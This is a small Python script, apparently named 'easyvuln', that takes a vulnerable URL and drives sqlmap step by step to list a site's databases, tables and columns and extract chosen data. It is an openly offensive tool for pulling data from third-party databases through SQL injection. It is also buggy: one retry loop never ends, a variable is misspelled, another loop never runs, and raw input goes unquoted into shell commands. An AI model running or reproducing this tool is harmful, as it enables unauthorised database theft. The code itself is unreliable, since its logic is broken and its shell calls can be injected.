import os
import sys, string
import termcolor
target = input("Enter the Vuln Link | easyvuln >  ")
maincount = 1
while(maincount<2):
    os.system("python sqlmap\sqlmap.py -u "+target+" --dbs")
    print("If the infiltration is successful, use one of the databases mentioned above.")
    greatcheck = input("Is the infiltration successful(Y/N) | easyvuln > ")
    if(greatcheck == "y" or greatcheck == "Y" or greatcheck == "yes" or greatcheck == "YES" or greatcheck == "Yes"):
        dbsselect = input("Type the database you want to capture | easyvuln > ")
        os.system("python sqlmap\sqlmap.py -u "+target+" -D "+dbsselect+" --tables")
        dbsselectcheck = input("If tables are listed, which table do you want. If it is not listed, you can try again. Type 'restart' to try again.  | easyvuln > ")
        count = 1
        while(count<2):
            if(dbsselectcheck == "restart" or dbsselectcheck == "RESTART" or dbsselectcheck == "Restart"):
                os.system("python sqlmap\sqlmap.py -u "+target+" -D "+dbsselect+" --tables")
            else:
                count += 1
        tableselect = input("Which 'tables' do you want to shoot | easyvuln > ")
        os.system("python sqlmap\sqlmap.py -u "+target+" -D "+dbsselect+" -T "+tableselect+" --columns" )
        tableselectcheck = input("If the columns haven't not listed. You want try again(Y/N) | easyvuln > ")
        if(tableselectcheck == "y" or tableselectcheck == "Y" or tableselectcheck == "Yes" or tableselectcheck == "YES" or tableselectcheck == "yes"):
            count2 = 1
            tableselect2 = input("Which 'tables' do you want to shoot | easyvuln > ")
            while(count2<1):
                os.system("python sqlmap\sqlmap.py -u "+target+" -D "+dbselect+" -T "+tableselect+" --columns" )
                tableselectcheck2 = input("If the columns haven't not listed. You try again(Y/N) | easyvuln > ")
                if(tableselectcheck2 == "y"):
                    print("Trying again...")
                else:
                    count2 += 1
        else:
            
            tableselect2 = input("What data or data would you like to retrieve in 'Tables' | easyvuln > ")
            os.system("python sqlmap\sqlmap.py -u "+target+" -D "+dbsselect+" -T "+tableselect+" -C "+tableselect2 )
    
        finish = input("\n1)Exit \neasyvuln > ")

        if(finish == "1"):
            maincount += 1
        
                                                                           
            

  

                 

        

            












            


